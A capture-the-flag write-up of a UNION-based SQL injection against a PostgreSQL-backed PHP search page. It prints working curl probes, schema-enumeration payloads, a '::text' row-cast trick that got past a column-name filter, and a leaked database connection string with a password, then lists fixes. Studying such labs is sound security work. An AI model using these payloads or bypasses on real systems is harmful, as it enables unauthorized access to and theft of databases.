# THE DAILY SCOOP, UNION-Based SQLi on PostgreSQL → Data Exfil, My Writeup

| | |
|---|---|
| **Platform** | pwnzone (hosted CTF event) |
| **Target** | THE DAILY SCOOP ("Newsroom records", `lookup.php` search) |
| **Service** | **Apache/2.4.68 (Debian)** + PHP front end, **PostgreSQL** backend (`:8032`), HTTP, TCP/8140 (EC2) |
| **IP:Port** | `54.72.82.22:8140` |
| **Flag format** | `safctf{...}` |
| **Date** | 2026-10-03 |
| **Outcome** | The record search is UNION-injectable (single column). I enumerated the schema, found a `super_secret` table, and dumped it by casting the whole row to text to dodge a column-name filter. An exposed `secrets.zip` had already leaked the Postgres DSN. |
| **Honesty note** | Second-wave sweep. Keeping in the small filter wall I hit when querying `information_schema.columns`, and the `::text` trick that walked around it. |

---

## 1. The Short Version

A newsroom "record search": type a case name, get matches. `name=Olwen'` returned a different page ("Archive database is starting") than a clean miss, a classic injection smell. The confirming test:

```bash
# baseline
curl -s --get http://54.72.82.22:8140/lookup.php --data-urlencode "name=Olwen"
# → one record: Olwen
# boolean-true injection
curl -s --get http://54.72.82.22:8140/lookup.php --data-urlencode "name=' OR '1'='1"
# → MORE records: Olwen, Riann
```

More rows on `OR '1'='1` = injectable. It's **PostgreSQL** (an exposed `secrets.zip` leaked `postgresql://olwen:...@localhost:8032/olwendb`). The result set is **one column**, so a single-column UNION works. I listed the tables, spotted `super_secret`, and read it:

```sql
x' UNION SELECT super_secret::text FROM super_secret-- -
→ (1,safctf{73c4979d1dccb358dbfbaca5233666ca})
```

**What I walked away with**

| Flag | Value | How |
|---|---|---|
| Flag | `safctf{73c4979d1dccb358dbfbaca5233666ca}` | single-column `UNION SELECT` → dump `super_secret` (row cast to `::text`) |

---

## 1.1 Attack Chain

```mermaid
flowchart TD
    A["lookup.php?name="] --> B["' OR '1'='1 → extra rows<br/>(injection confirmed)"]
    B --> C["ORDER BY → 1 column<br/>engine = PostgreSQL"]
    C --> D["UNION SELECT table_name<br/>FROM information_schema.tables"]
    D --> E["tables: users, super_secret"]
    E --> F["column-name query filtered →<br/>cast row: super_secret::text"]
    F --> R["🏁 safctf{...}"]

    classDef flag fill:#1a3a1a,stroke:#4caf50,color:#e0ffe0;
    classDef vuln fill:#3a1a1a,stroke:#e57373,color:#ffe0e0;
    class R flag;
    class B,F vuln;
```

---

## 2. Weaknesses I Used

| # | What | Class | Where | Severity |
|---|---|---|---|---|
| 1 | Search query built by concatenation | **SQL Injection (UNION-based)** (CWE-89) | `GET /lookup.php?name=` | Critical |
| 2 | Postgres connection string in a web-root zip | Exposed config/secret (CWE-538) | `/secrets.zip` | High |
| 3 | Column-name filter bypassed by row-to-text cast | Incomplete blocklist (CWE-184) | query path |, |

---

## 3. Recon

```bash
r(){ curl -s --get http://54.72.82.22:8140/lookup.php --data-urlencode "name=$1"; }
r "Olwen"          # → "Olwen"
r "Olwen'"         # → "Archive database is starting"   (error path on a stray quote)
r "' OR '1'='1"    # → "Olwen Riann"                     (boolean true → all rows)
```

I also grabbed the linked `secrets.zip` from the root; it contained a `secrets` file with the datasource:

```
postgresql://olwen:Olwen+SereneVale#2024@localhost:8032/olwendb?schema=public
```

So the backend is **PostgreSQL** on `:8032` (and a set of creds, handy to confirm the engine even before fingerprinting via SQL).

---

## 4. The Exploit

### 4.1 Column count + confirm engine

`UNION` needs a matching column count. `ORDER BY` probes it:

```bash
r "x' ORDER BY 1-- -"   # normal page  → column 1 exists
r "x' ORDER BY 2-- -"   # "Archive database is starting" → error → only 1 column
```

One column. Confirm with a one-column UNION:

```bash
r "x' UNION SELECT 'INJ'-- -"   # → page shows "INJ"  ✅ UNION works, 1 col
```

### 4.2 Enumerate the schema

```sql
x' UNION SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'-- -
→ users,super_secret
```

`super_secret` is the obvious target. I tried to list its columns next, and hit a wall:

```sql
x' UNION SELECT string_agg(table_name||'.'||column_name,', ') FROM information_schema.columns ...-- -
→ "Invalid case name"      (filtered / rejected)
```

Something in that query (a blocked keyword or the `information_schema.columns` reference) tripped a filter.

### 4.3 The bypass, cast the whole row to text

PostgreSQL lets you reference a table as a composite value and cast it to `text`, so I don't need column names at all:

```sql
x' UNION SELECT super_secret::text FROM super_secret-- -
→ (1,safctf{73c4979d1dccb358dbfbaca5233666ca})
```

`super_secret::text` serializes the entire row (`(id, value)`) as `(1,safctf{...})`. No `information_schema.columns`, no column names, no blocked tokens, the flag drops out. (For completeness, `users::text` gave `(2,Riann) (1,Olwen)`, the visible records.)

---

## 5. Why It Worked & How I'd Fix It

- **Root cause:** `lookup.php` concatenates `name` into the SQL `WHERE`, so a quote escapes the string and `UNION SELECT` appends my own result set to the newsroom's.
- **Postgres specifics that helped:** reflected/behavioural errors told me when I was close; `::text` row casting is a clean way to exfil without knowing the schema; `string_agg` pulls many rows into one cell for a single-column sink.
- **The filter** blocked a keyword/`information_schema.columns`, but SQL offers many equivalent routes (row casts, `pg_catalog`, `to_jsonb(t)`), so it only slowed me down.

Fixes:

1. **Parameterised queries**: `pg_query_params($conn, 'SELECT ... WHERE name=$1', [$name])`. Kills UNION injection outright.
2. **Least-privilege DB role**, the web user shouldn't read a `super_secret` table at all; separate sensitive data and restrict grants.
3. **Don't ship the DSN**, `secrets.zip` in the web root handed out credentials (see the exposed-files guide).
4. **Generic errors**, "Archive database is starting" and reflected behaviour were a usable oracle.
5. **Blocklists aren't the fix**, `::text`/`to_jsonb` walk around column-name filters trivially.

---

## 6. Timeline

- `name=Olwen'` error vs. `' OR '1'='1` extra rows → injection confirmed.
- `secrets.zip` → Postgres DSN → engine known.
- `ORDER BY` → 1 column; `UNION SELECT 'INJ'` → UNION works.
- `information_schema.tables` → `users, super_secret`.
- column-name query filtered → `super_secret::text` row cast → flag.

---

## 7. References

- PortSwigger, **SQL injection UNION attacks**, **Examining the database**
- PostgreSQL docs, composite type `::text` casts, `string_agg`, `to_jsonb`
- CWE-89 (SQLi), CWE-538 (Exposed config), CWE-184 (Incomplete Blocklist)

**Lesson I'm keeping:** on Postgres you don't need column names, `table::text` dumps the whole row. When a column-name query gets filtered, cast the row and move on.
